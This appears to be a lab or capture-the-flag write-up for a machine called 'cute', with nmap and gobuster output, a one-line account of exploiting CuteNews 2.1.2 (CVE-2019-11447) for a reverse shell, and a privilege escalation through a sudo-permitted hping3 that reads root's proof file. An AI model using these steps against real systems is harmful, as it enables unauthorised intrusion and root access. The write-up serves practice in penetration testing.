# NMAP
```
PORT    STATE SERVICE  REASON         VERSION
22/tcp  open  ssh      syn-ack ttl 63 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 04:d0:6e:c4:ba:4a:31:5a:6f:b3:ee:b8:1b:ed:5a:b7 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDfExBygmjGp3e7nXpwC4vVz4LWCyYHz0L7j/LG/9jppdNt9Mu+zgnzKeiXSl7MUUNHxX2diHm7cdwzjRZATsPHs/x8QXhkwLpcJNvKAKl4dg+HFJIJaQH1yyzdY93yoiRrjqG37VJ4FCh68d8ouC4UGtsf9jjzxA3LwPpn7q8Tw/uqN/8+CMdmTyqa07Z2mVdmkzyokknCX40ZCBCUNPgQYTQYLW3GAmJMuHcE5d7SSyogWeqPbkM7Mub3x5rwYL1Wf+9Y8I5SbmMcFRHOSGroKHYcvbvt8A/VUqw44XtzvPdllhfFbwWpj1xwcNILi1WgWoBw3ymD14PFZUWXUZbR
|   256 24:b3:df:01:0b:ca:c2:ab:2e:e9:49:b0:58:08:6a:fa (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBiSQebU59RFA2H+6WZcwxmwTS9j3i3ttgEcwQi8oJoo7UNtulXExHcLQt2AXsZuRk6WilnLEoKyZxwC5DWsikE=
|   256 6a:c4:35:6a:7a:1e:7e:51:85:5b:81:5c:7c:74:49:84 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIF6g+3N64VFhd+Aw/pbyZ7+qU1m+PoxIE9Rmeo61lXIe
80/tcp  open  http     syn-ack ttl 63 Apache httpd 2.4.38 ((Debian))
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-favicon: Unknown favicon MD5: 759585A56089DB516D1FBBBE5A8EEA57
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.38 (Debian)
88/tcp  open  http     syn-ack ttl 63 nginx 1.14.2
|_http-title: 404 Not Found
|_http-server-header: nginx/1.14.2
110/tcp open  pop3     syn-ack ttl 63 Courier pop3d
|_pop3-capabilities: LOGIN-DELAY(10) PIPELINING USER TOP IMPLEMENTATION(Courier Mail Server) UTF8(USER) UIDL STLS
| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US/organizationalUnitName=Automatically-generated POP3 SSL key/localityName=New York
| Subject Alternative Name: email:postmaster@example.com
| Issuer: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US/organizationalUnitName=Automatically-generated POP3 SSL key/localityName=New York
| Public Key type: rsa
| Public Key bits: 3072
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-09-17T16:28:06
| Not valid after:  2021-09-17T16:28:06
| MD5:   5ee2 40c8 66d1 b327 71e6 085a f50b 7e28
| SHA-1: 28a3 acc0 86a7 cd64 8f09 78fa 1792 7032 0ecc b154
| -----BEGIN CERTIFICATE-----
| MIIE6zCCA1OgAwIBAgIBATANBgkqhkiG9w0BAQsFADCBjjESMBAGA1UEAxMJbG9j
| YWxob3N0MS0wKwYDVQQLEyRBdXRvbWF0aWNhbGx5LWdlbmVyYXRlZCBQT1AzIFNT
| TCBrZXkxHDAaBgNVBAoTE0NvdXJpZXIgTWFpbCBTZXJ2ZXIxETAPBgNVBAcTCE5l
| dyBZb3JrMQswCQYDVQQIEwJOWTELMAkGA1UEBhMCVVMwHhcNMjAwOTE3MTYyODA2
| WhcNMjEwOTE3MTYyODA2WjCBjjESMBAGA1UEAxMJbG9jYWxob3N0MS0wKwYDVQQL
| EyRBdXRvbWF0aWNhbGx5LWdlbmVyYXRlZCBQT1AzIFNTTCBrZXkxHDAaBgNVBAoT
| E0NvdXJpZXIgTWFpbCBTZXJ2ZXIxETAPBgNVBAcTCE5ldyBZb3JrMQswCQYDVQQI
| EwJOWTELMAkGA1UEBhMCVVMwggGiMA0GCSqGSIb3DQEBAQUAA4IBjwAwggGKAoIB
| gQDIBsPdZDb45UVqWpRZiqVqbC1vCd4mXw2Qif5BWHME351unfanqY3pywEGOPha
| J7HuyhLzSF2dWmF3z8I+g4C5q4xO3MglQ2CHfJyAxvfk+pD7omcaFi3N7j5JnPsJ
| enmVWNalaI6bCPGcf1P5ymeHLK61FqL+/Rlaw2x2rsbA+XxNXPdrqOFA4XinNb09
| EiO/qSCmL1r9Q9bTrMkByecJ7iEUK5EwQBDUCoUywnJ+Pu0gExw3mdscKSb3oNw8
| IBZhY6jXGMqjrBQ4pwqWWV9/ljEXEQj6gEqSjweOyYoA3OuB9+5ppTBRzpB22bMq
| kvHnCO0u9h6tSjwZ7+vxynuaVKuyxcfMLl4bO7EYy/dZjJ2fWHZtGkGm4q/HZ97r
| M8gYeEoEr5s5jNmRVrxejO/9w5zNsrZCPt///bFF+h1TWvV1IaCchuxE32srOQfl
| UUgJ4XhgcqD6DaG5nqtJ7LrpN0TcvP373c6J8CJ2b/JSuyHP04TvAEEJYj+vMnVG
| ZsUCAwEAAaNSMFAwDAYDVR0TAQH/BAIwADAhBgNVHREEGjAYgRZwb3N0bWFzdGVy
| QGV4YW1wbGUuY29tMB0GA1UdDgQWBBTFu1JxVBbqWHll0UH7hPEBv+KFizANBgkq
| hkiG9w0BAQsFAAOCAYEADawbz6QNBk3+miizqqXooRU2wZcx+Du6iM92rKLNZCq+
| wEXZEdxGi/WSOY7UxrJbP6dfxvyIpmwsZjFOqNr3w3l0Y/Nwdw23o6gxOlkDFt9p
| dTopD2CYEwmIiRgT60ulZ+gIcHeJu4ExVQ8PDxRnWPEECodQHWrPBVyRa585FQB0
| YpUMjahA98qcvWCaNAI824uDZ9frptM4syzTKFjl/CYuhXGdNDTbq1fjaOJ1MXvh
| qCzKG3A4JLf3R448QtcB5n8LhgwO7w6y7XjBAPYmOcEiuBhRTzy2dzKHLhxXFaHI
| J9A8csWHebvYr80Th7ELpkNgXCnu3mbr2DkWk7hbYSTfcmgi+ISkd892MOllLiu/
| 3dWqund8Bg2gOExQbdeyOMg4+WeQedUQ4sWjI8s7QL9o6H9kwRVsabkYGxfl56Zz
| xrI2K3odZgnCnFCzlu/2cbuzNfF7DvvKHs057F3PzIVxSPuoTcgLNllr4tJqABjY
| JpyNakJF76tDW03eEoAT
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
995/tcp open  ssl/pop3 syn-ack ttl 63 Courier pop3d
|_pop3-capabilities: LOGIN-DELAY(10) PIPELINING USER TOP IMPLEMENTATION(Courier Mail Server) UTF8(USER) UIDL
| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US/organizationalUnitName=Automatically-generated POP3 SSL key/localityName=New York
| Subject Alternative Name: email:postmaster@example.com
| Issuer: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US/organizationalUnitName=Automatically-generated POP3 SSL key/localityName=New York
| Public Key type: rsa
| Public Key bits: 3072
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-09-17T16:28:06
| Not valid after:  2021-09-17T16:28:06
| MD5:   5ee2 40c8 66d1 b327 71e6 085a f50b 7e28
| SHA-1: 28a3 acc0 86a7 cd64 8f09 78fa 1792 7032 0ecc b154
| -----BEGIN CERTIFICATE-----
| MIIE6zCCA1OgAwIBAgIBATANBgkqhkiG9w0BAQsFADCBjjESMBAGA1UEAxMJbG9j
| YWxob3N0MS0wKwYDVQQLEyRBdXRvbWF0aWNhbGx5LWdlbmVyYXRlZCBQT1AzIFNT
| TCBrZXkxHDAaBgNVBAoTE0NvdXJpZXIgTWFpbCBTZXJ2ZXIxETAPBgNVBAcTCE5l
| dyBZb3JrMQswCQYDVQQIEwJOWTELMAkGA1UEBhMCVVMwHhcNMjAwOTE3MTYyODA2
| WhcNMjEwOTE3MTYyODA2WjCBjjESMBAGA1UEAxMJbG9jYWxob3N0MS0wKwYDVQQL
| EyRBdXRvbWF0aWNhbGx5LWdlbmVyYXRlZCBQT1AzIFNTTCBrZXkxHDAaBgNVBAoT
| E0NvdXJpZXIgTWFpbCBTZXJ2ZXIxETAPBgNVBAcTCE5ldyBZb3JrMQswCQYDVQQI
| EwJOWTELMAkGA1UEBhMCVVMwggGiMA0GCSqGSIb3DQEBAQUAA4IBjwAwggGKAoIB
| gQDIBsPdZDb45UVqWpRZiqVqbC1vCd4mXw2Qif5BWHME351unfanqY3pywEGOPha
| J7HuyhLzSF2dWmF3z8I+g4C5q4xO3MglQ2CHfJyAxvfk+pD7omcaFi3N7j5JnPsJ
| enmVWNalaI6bCPGcf1P5ymeHLK61FqL+/Rlaw2x2rsbA+XxNXPdrqOFA4XinNb09
| EiO/qSCmL1r9Q9bTrMkByecJ7iEUK5EwQBDUCoUywnJ+Pu0gExw3mdscKSb3oNw8
| IBZhY6jXGMqjrBQ4pwqWWV9/ljEXEQj6gEqSjweOyYoA3OuB9+5ppTBRzpB22bMq
| kvHnCO0u9h6tSjwZ7+vxynuaVKuyxcfMLl4bO7EYy/dZjJ2fWHZtGkGm4q/HZ97r
| M8gYeEoEr5s5jNmRVrxejO/9w5zNsrZCPt///bFF+h1TWvV1IaCchuxE32srOQfl
| UUgJ4XhgcqD6DaG5nqtJ7LrpN0TcvP373c6J8CJ2b/JSuyHP04TvAEEJYj+vMnVG
| ZsUCAwEAAaNSMFAwDAYDVR0TAQH/BAIwADAhBgNVHREEGjAYgRZwb3N0bWFzdGVy
| QGV4YW1wbGUuY29tMB0GA1UdDgQWBBTFu1JxVBbqWHll0UH7hPEBv+KFizANBgkq
| hkiG9w0BAQsFAAOCAYEADawbz6QNBk3+miizqqXooRU2wZcx+Du6iM92rKLNZCq+
| wEXZEdxGi/WSOY7UxrJbP6dfxvyIpmwsZjFOqNr3w3l0Y/Nwdw23o6gxOlkDFt9p
| dTopD2CYEwmIiRgT60ulZ+gIcHeJu4ExVQ8PDxRnWPEECodQHWrPBVyRa585FQB0
| YpUMjahA98qcvWCaNAI824uDZ9frptM4syzTKFjl/CYuhXGdNDTbq1fjaOJ1MXvh
| qCzKG3A4JLf3R448QtcB5n8LhgwO7w6y7XjBAPYmOcEiuBhRTzy2dzKHLhxXFaHI
| J9A8csWHebvYr80Th7ELpkNgXCnu3mbr2DkWk7hbYSTfcmgi+ISkd892MOllLiu/
| 3dWqund8Bg2gOExQbdeyOMg4+WeQedUQ4sWjI8s7QL9o6H9kwRVsabkYGxfl56Zz
| xrI2K3odZgnCnFCzlu/2cbuzNfF7DvvKHs057F3PzIVxSPuoTcgLNllr4tJqABjY
| JpyNakJF76tDW03eEoAT
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
```

# Gobuster
```
gobuster dir -u http://192.168.65.128/ -w /opt/wordlists/rockyou.txt -t 30 -x php,html,txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.65.128/
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /opt/wordlists/rockyou.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
2021/11/29 15:09:27 Starting gobuster in directory enumeration mode
===============================================================
Progress: 532 / 57377572 (0.00%)
/index.php            (Status: 200) [Size: 5054]
/search.php           (Status: 200) [Size: 5054]
Progress: 21464 / 57377572 (0.04%)             [ERROR] 2021/11/29 15:12:50 [!] parse "http://192.168.65.128/!@#$%^": invalid URL escape "%^"
Progress: 39540 / 57377572 (0.07%)             ^C
[!] Keyboard interrupt detected, terminating.
                                                
===============================================================
2021/11/29 15:15:28 Finished
===============================================================
```

## Reverse Shell
Register an account <br />
RCE for CuteNews 2.1.2 (CVE-2019-11447) in avatar upload function<br />
Get reverse shell <br />

## local.txt
Local.txt was found on /var/www/
```
www-data@cute:/var/www/html/uploads$ ls -la ../..
ls -la ../..
total 16
drwxr-xr-x  3 root     root     4096 Jan 26  2021 .
drwxr-xr-x 12 root     root     4096 Sep 17  2020 ..
drwxr-xr-x  9 www-data users    4096 Sep 18  2020 html
-rw-r--r--  1 www-data www-data   33 Nov 29 08:07 local.txt
```

# Priv Esc
```
www-data@cute:/var/www$ sudo -l
Matching Defaults entries for www-data on cute:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on cute:
    (root) NOPASSWD: /usr/sbin/hping3 --icmp

www-data@cute:/var/www$ hping3

hping3> id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)

hping3> ls -la /root
total 28
drwx------  3 root root 4096 Nov 29 08:07 .
drwxr-xr-x 18 root root 4096 Sep 17  2020 ..
lrwxrwxrwx  1 root root    9 Jan 20  2021 .bash_history -> /dev/null
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
drwxr-xr-x  2 root root 4096 Jan 20  2021 .ssh
-rw-------  1 root root   33 Nov 29 08:07 proof.txt
-rw-------  1 root root   32 Jan 26  2021 root.txt
hping3> cat /root/proof.txt
```
